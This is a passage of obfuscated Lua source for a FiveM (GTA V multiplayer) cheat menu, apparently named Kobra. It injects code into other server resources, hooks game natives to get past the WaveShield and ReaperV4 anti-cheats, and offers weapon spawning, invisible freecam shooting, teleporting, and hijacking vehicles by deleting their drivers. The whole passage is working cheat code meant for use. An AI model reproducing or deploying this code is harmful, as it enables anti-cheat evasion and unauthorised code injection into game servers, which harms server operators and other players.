                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1528,v1531));Wait(311 -161 );ShootSingleBulletBetweenCoords(v1523.x,v1523.y,v1523.z,v1527.x,v1527.y,v1527.z,100,true,v1529,v1528,true,false,90805 + 9195 );end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v962   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1406(v1471) local v1472=math.rad(v1471.z);local v1473=math.rad(v1471.x);local v1474=math.abs(math.cos(v1473));return vector3( -math.sin(v1472) * v1474 ,math.cos(v1472) * v1474 ,math.sin(v1473));end function hNative(v1475,v1476) local v1477=_G[v1475];if ( not v1477 or (type(v1477)~="function")) then return;end _G[v1475]=function(...) return v1476(v1477,...);end;end hNative("CreateThread",function(v1478,...) return v1478(...);end);hNative("Wait",function(v1479,...) return v1479(...);end);hNative("PlayerPedId",function(v1480,...) return v1480(...);end);hNative("GetHashKey",function(v1481,...) return v1481(...);end);hNative("GiveWeaponToPed",function(v1482,...) return v1482(...);end);hNative("SetCurrentPedWeapon",function(v1483,...) return v1483(...);end);hNative("GetCurrentPedWeapon",function(v1484,...) return v1484(...);end);hNative("RemoveWeaponFromPed",function(v1485,...) return;end);local v1407=GetCamCoord(_G.KobraFreecamObject);local v1408=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1409=v1406(v1408);local v1410=180 + 820 ;local v1411=v1407 + (v1409 * v1410) ;local v1412=PlayerPedId();local v1413=GetHashKey(v962);GiveWeaponToPed(PlayerPedId(),v1413,169 + 81 ,false,true);SetCurrentPedWeapon(PlayerPedId(),v1413,true);ShootSingleBulletBetweenCoords(v1407.x,v1407.y,v1407.z,v1411.x,v1411.y,v1411.z,258 -(139 + 19) ,true,v1413,v1412,true,false,17833 + 82167 );end break;end if (v961==0) then v962=v36[v34];if (v962=="WEAPON_PERMKILL") then v962="WEAPON_TRANQUILIZER";elseif (v962=="WEAPON_RPG_2") then v962="WEAPON_AIRSTRIKE_ROCKET";end v961=1;end end end end if IsDisabledControlJustPressed(1993 -(1687 + 306) ,24) then local v824=v654;if (v824=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1287(v1321) local v1322=math.rad(v1321.z);local v1323=math.rad(v1321.x);local v1324=math.abs(math.cos(v1323));return vector3( -math.sin(v1322) * v1324 ,math.cos(v1322) * v1324 ,math.sin(v1323));end function GetEmptySeat(v1325) local v1326={ -(1155 -(1018 + 136)),0,4 -3 ,817 -(117 + 698) };for v1366,v1367 in ipairs(v1326) do if IsVehicleSeatFree(v1325,v1367) then return v1367;end end return  -(482 -(305 + 176));end local v1288=GetCamCoord(_G.KobraFreecamObject);local v1289=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1290=v1287(v1289);local v1291=748 + 252 ;local v1292=v1288 + (v1290 * v1291) ;local v1293=StartShapeTestRay(v1288.x,v1288.y,v1288.z,v1292.x,v1292.y,v1292.z, -(1 -0),PlayerPedId(),0);local v1294,v1295,v1296,v1294,v1297=GetShapeTestResult(v1293);if v1295 then if ((v1297~=(0 + 0)) and IsEntityAVehicle(v1297)) then local v1486=v1297;local v1487=PlayerPedId();local v1488=GetEmptySeat(v1486);if (v1488== -(1 -0)) then TaskWarpPedIntoVehicle(v1487,v1486, -(2 -1));elseif (v1488>=(0 -0)) then TaskWarpPedIntoVehicle(v1487,v1486,v1488);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end else SetEntityCoords(PlayerPedId(),v1296.x,v1296.y,v1296.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local function v1188(v1235) local v1236=260 -(159 + 101) ;local v1237;local v1238;local v1239;while true do if ((4 -3)==v1236) then v1239=math.abs(math.cos(v1238));return vector3( -math.sin(v1237) * v1239 ,math.cos(v1237) * v1239 ,math.sin(v1238));end if (v1236==0) then v1237=math.rad(v1235.z);v1238=math.rad(v1235.x);v1236=3 -2 ;end end end function GetEmptySeat(v1240) local v1241=0 + 0 ;local v1242;while true do if (v1241==(3 -2)) then return  -1;end if ((0 -0)==v1241) then v1242={ -1,266 -(112 + 154) ,32 -(21 + 10) ,2 + 0 };for v1414,v1415 in ipairs(v1242) do if IsVehicleSeatFree(v1240,v1415) then return v1415;end end v1241=664 -(96 + 567) ;end end end local v1189=GetCamCoord(_G.KobraFreecamObject);local v1190=GetCamRot(_G.KobraFreecamObject,2);local v1191=v1188(v1190);local v1192=1000;local v1193=v1189 + (v1191 * v1192) ;local v1194=StartShapeTestRay(v1189.x,v1189.y,v1189.z,v1193.x,v1193.y,v1193.z, -1,PlayerPedId(),0 -0 );local v1195,v1196,v1197,v1195,v1198=GetShapeTestResult(v1194);if v1196 then if ((v1198~=(0 + 0)) and IsEntityAVehicle(v1198)) then local v1368=0 -0 ;local v1369;local v1370;local v1371;while true do if (v1368==(1696 -(867 + 828))) then v1371=GetEmptySeat(v1369);if (v1371== -1) then TaskWarpPedIntoVehicle(v1370,v1369, -(2 -1));elseif (v1371>=(0 -0)) then TaskWarpPedIntoVehicle(v1370,v1369,v1371);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end if (v1368==(0 -0)) then v1369=v1198;v1370=PlayerPedId();v1368=1;end end else MachoInjectThread(0 -0 ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1197.x   .. [[, ]]   .. v1197.y   .. [[, ]]   .. v1197.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end end elseif (v824=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1199=0 + 0 ;local v1200;while true do if (v1199==(0 -0)) then v1200=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1200,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1327,v1328) local v1329=_G[v1327];if ( not v1329 or (type(v1329)~="function")) then return;end _G[v1327]=function(...) return v1328(v1329,...);end;end hNative("CreateThread",function(v1330,...) return v1330(...);end);hNative("Wait",function(v1331,...) return v1331(...);end);hNative("DoesEntityExist",function(v1332,...) return v1332(...);end);hNative("GetEntityCoords",function(v1333,...) return v1333(...);end);hNative("GetCamCoord",function(v1334,...) return v1334(...);end);hNative("GetCamRot",function(v1335,...) return v1335(...);end);hNative("StartShapeTestRay",function(v1336,...) return v1336(...);end);hNative("GetShapeTestResult",function(v1337,...) return v1337(...);end);hNative("GetPedInVehicleSeat",function(v1338,...) return v1338(...);end);hNative("SetEntityVisible",function(v1339,...) return v1339(...);end);hNative("DeletePed",function(v1340,...) return v1340(...);end);hNative("ClearPedTasksImmediately",function(v1341,...) return v1341(...);end);hNative("SetEntityCoordsNoOffset",function(v1342,...) return v1342(...);end);hNative("IsEntityAVehicle",function(v1343,...) return v1343(...);end);hNative("SetPedIntoVehicle",function(v1344,...) return v1344(...);end);hNative("PlayerPedId",function(v1345,...) return v1345(...);end);hNative("NetworkRequestControlOfEntity",function(v1346,...) return v1346(...);end);hNative("NetworkHasControlOfEntity",function(v1347,...) return v1347(...);end);local function v1298(v1348,v1349) local v1350=771 -(134 + 637) ;local v1351;while true do if (v1350==0) then v1349=v1349 or 2000 ;v1351=GetGameTimer();v1350=1 + 0 ;end if ((1158 -(775 + 382))==v1350) then while (GetGameTimer() -v1351)<v1349  do if NetworkHasControlOfEntity(v1348) then return true;end NetworkRequestControlOfEntity(v1348);Wait(0);end return NetworkHasControlOfEntity(v1348);end end end local function v1299(v1352) local v1353=0 -0 ;local v1354;local v1355;local v1356;while true do if (v1353==0) then v1354=math.rad(v1352.z);v1355=math.rad(v1352.x);v1353=608 -(45 + 562) ;end if ((863 -(545 + 317))==v1353) then v1356=math.abs(math.cos(v1355));return vector3( -math.sin(v1354) * v1356 ,math.cos(v1354) * v1356 ,math.sin(v1355));end end end function GetEmptySeat(v1357) local v1358=0 -0 ;local v1359;while true do if (v1358==(1026 -(763 + 263))) then v1359={ -(1751 -(512 + 1238)),0 -0 ,1247 -(533 + 713) ,827 -(499 + 326) };for v1532,v1533 in ipairs(v1359) do if IsVehicleSeatFree(v1357,v1533) then return v1533;end end v1358=1 -0 ;end if (v1358==1) then return  -(425 -(104 + 320));end end end local v1300=PlayerPedId();local v1301=GetEntityCoords(v1300);local v1302=GetCamCoord(_G.KobraFreecamObject);local v1303=GetCamRot(_G.KobraFreecamObject,1999 -(1929 + 68) );local v1304=v1299(v1303);local v1305=1000;local v1306=v1302 + (v1304 * v1305) ;local v1307=StartShapeTestRay(v1302.x,v1302.y,v1302.z,v1306.x,v1306.y,v1306.z, -(1324 -(1206 + 117)),v1300,0 + 0 );local v1308,v1309,v1310,v1308,v1311=GetShapeTestResult(v1307);local function v1312(v1360) local v1361=1592 -(683 + 909) ;local v1362;while true do if (v1361==(0 -0)) then if ( not v1360 or  not DoesEntityExist(v1360)) then return;end v1362=GetPedInVehicleSeat(v1360, -(1 -0));v1361=778 -(772 + 5) ;end if (v1361==(1428 -(19 + 1408))) then if ((v1362~=0) and DoesEntityExist(v1362)) then SetPedIntoVehicle(v1300,v1360,288 -(134 + 154) );v1298(v1360,2000);Wait(16 -6 );for v1582=0 -0 ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1362   .. [[)
                                        ]] );end Wait(14 + 26 );SetPedIntoVehicle(v1300,v1360, -(1 + 0));Wait(203 -(10 + 192) );SetPedIntoVehicle(v1300,v1360,GetEmptySeat(v1360));Wait(48 -(13 + 34) );SetPedIntoVehicle(v1300,v1360, -1);Wait(1739 -(342 + 947) );ClearPedTasksImmediately(v1300);SetEntityCoordsNoOffset(v1300,v1301.x,v1301.y,v1301.z,true,true,true,true);Wait(412 -312 );end break;end end end CreateThread(function() if v1309 then if ((v1311~=(1708 -(119 + 1589))) and IsEntityAVehicle(v1311)) then local v1534=v1311;v1312(v1534);end end end);end elseif (v824=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1313=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1313,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then function hNative(v1416,v1417) local v1418=_G[v1416];if ( not v1418 or (type(v1418)~="function")) then return;end _G[v1416]=function(...) return v1417(v1418,...);end;end hNative("CreateThread",function(v1419,...) return v1419(...);end);hNative("Wait",function(v1420,...) return v1420(...);end);hNative("DoesEntityExist",function(v1421,...) return v1421(...);end);hNative("GetEntityCoords",function(v1422,...) return v1422(...);end);hNative("GetCamCoord",function(v1423,...) return v1423(...);end);hNative("GetCamRot",function(v1424,...) return v1424(...);end);hNative("StartShapeTestRay",function(v1425,...) return v1425(...);end);hNative("GetShapeTestResult",function(v1426,...) return v1426(...);end);hNative("GetPedInVehicleSeat",function(v1427,...) return v1427(...);end);hNative("SetEntityVisible",function(v1428,...) return v1428(...);end);hNative("DeletePed",function(v1429,...) return v1429(...);end);hNative("ClearPedTasksImmediately",function(v1430,...) return v1430(...);end);hNative("SetEntityCoordsNoOffset",function(v1431,...) return v1431(...);end);hNative("IsEntityAVehicle",function(v1432,...) return v1432(...);end);hNative("SetPedIntoVehicle",function(v1433,...) return v1433(...);end);hNative("PlayerPedId",function(v1434,...) return v1434(...);end);hNative("NetworkRequestControlOfEntity",function(v1435,...) return v1435(...);end);hNative("NetworkHasControlOfEntity",function(v1436,...) return v1436(...);end);local function v1372(v1437,v1438) local v1439=0 -0 ;local v1440;while true do if (0==v1439) then v1438=v1438 or (2769 -769) ;v1440=GetGameTimer();v1439=553 -(545 + 7) ;end if (v1439==(2 -1)) then while (GetGameTimer() -v1440)<v1438  do if NetworkHasControlOfEntity(v1437) then return true;end NetworkRequestControlOfEntity(v1437);Wait(0);end return NetworkHasControlOfEntity(v1437);end end end local function v1373(v1441) local v1442=math.rad(v1441.z);local v1443=math.rad(v1441.x);local v1444=math.abs(math.cos(v1443));return vector3( -math.sin(v1442) * v1444 ,math.cos(v1442) * v1444 ,math.sin(v1443));end function GetEmptySeat(v1445) local v1446={ -(1704 -(494 + 1209)),998 -(197 + 801) ,4 -3 ,2};for v1489,v1490 in 